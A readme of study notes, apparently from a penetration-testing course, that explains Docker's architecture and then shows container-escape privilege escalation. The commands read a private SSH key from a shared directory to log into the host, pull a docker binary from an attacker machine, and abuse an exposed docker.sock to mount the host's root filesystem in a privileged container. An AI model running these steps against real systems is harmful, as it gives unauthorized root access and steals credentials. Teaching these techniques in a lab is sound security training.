readme.md


<a id="orga5a050d"></a>

## Docker

Docker is an open-source tool that provides a consistent runtime environment for software applications through the use of containers. Containers are isolated environments that run at the operating system level and share system resources, making them efficient and portable. Docker encapsulates applications into containers, which are lightweight, standalone executable packages containing all the necessary components to run an application.

`Docker Architecture`:
The Docker architecture follows a client-server model with two primary components:

`Docker Daemon`: Also known as the Docker server, it manages container creation, execution, and monitoring. It handles image management, monitoring, logging, resource utilization, container networking, and storage management, including Docker volumes.

`Docker Client`: It serves as the interface for users to interact with Docker. Users issue commands through the Docker Client, which communicates with the Docker Daemon via a RESTful API or Unix socket. Users can perform various tasks, such as creating, starting, stopping, managing containers, searching, downloading images, and more.

`Docker Clients`:
Docker Compose is another client for Docker, simplifying the orchestration of multiple containers as a single application. Users define their application's architecture using a declarative `YAML file`, specifying **container images, dependencies, configurations, networking, volume bindings, and other settings**. Docker Compose ensures that all defined containers are launched and interconnected to create a cohesive application stack.

`Docker Desktop`:
Docker Desktop is a user-friendly GUI tool available for macOS, Windows, and Linux. It simplifies container management by providing visual monitoring of container status, log inspection, and resource allocation management. Docker Desktop is suitable for developers of all expertise levels and supports Kubernetes.

`Docker Images and Containers`:
`Docker Images`: These serve as blueprints or templates for creating containers. An image contains everything required to run an application, including code, dependencies, libraries, and configurations. Images are read-only and ensure consistency across different environments. `Dockerfiles` define the steps and instructions for building images.

`Docker Containers`: Containers are instances of Docker images. They are **lightweight, isolated, and executable environments** for running applications. Containers inherit properties and configurations from their parent images. Each container **operates independently with its own filesystem, processes, and network interfaces**, ensuring separation from the host system and other containers. Containers are mutable and can be interacted with during runtime, but changes are not persisted unless saved as a new image or stored in a persistent volume.

In summary, Docker simplifies the deployment and management of applications by using containers to encapsulate everything needed for an application to run consistently across various environments.

`Docker Privilage Escalation`
What can happen is that we get access to an environment where we will find users who can manage docker containers. With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. We can use several ways and techniques to escalate our privileges or escape the docker container.


<a id="org78709ed"></a>

### Docker Shared Directories

In Docker, shared directories, or volume mounts, connect the host system and container filesystems. They enable data persistence, code sharing, and collaboration. Administrators define shared paths between the host and container. Shared directories can be read-only or read-write, offering flexibility.
When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.

    ls -l
    cat .ssh/id_rsa

From here on, we could copy the contents of the private SSH key to cry0l1t3.priv file and use it to log in as the user cry0l1t3 on the host system.

    ssh cry0l1t3@<host IP> -i cry0l1t3.priv


<a id="orgb6b85be"></a>

### Docker Socket

In summary, a Docker socket, or Docker daemon socket, serves as a crucial communication channel between the Docker client and the Docker daemon. It can use either a Unix socket or a network socket, depending on the Docker configuration. This socket enables users to issue commands through the Docker CLI, with the Docker client transmitting these commands to the Docker socket. The Docker daemon then processes these commands and carries out the requested actions.

To ensure secure communication and prevent unauthorized access, Docker sockets are typically restricted to specific users or user groups. This access control ensures that only trusted individuals can interact with the Docker daemon through the socket. Moreover, exposing the Docker socket over a network interface allows for remote management of Docker hosts, offering increased flexibility for distributed Docker setups and remote administration.

However, it's important to be aware of potential security risks associated with Docker sockets. Depending on the configuration, automated processes or tasks may store files that contain sensitive information. Malicious actors could exploit this information to escape the Docker container and gain unauthorized access. Therefore, it's essential to implement robust security measures and conduct regular audits of your Docker setup to mitigate these risks effectively and maintain a secure Docker environment.

    ls -al
    
    total 8
    drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
    drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
    srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86_64/docker) and upload it to the Docker container.

    wget https://<parrot-os>:443/docker -O docker
    chmod +x docker
    ls -l
    
    -rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
    
    /tmp/docker -H unix:///app/docker.sock ps
    
    CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
    3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   ap

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.

    /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
    /tmp/docker -H unix:///app/docker.sock ps
    
    CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
    7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
    3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
    <SNIP>

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

    /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
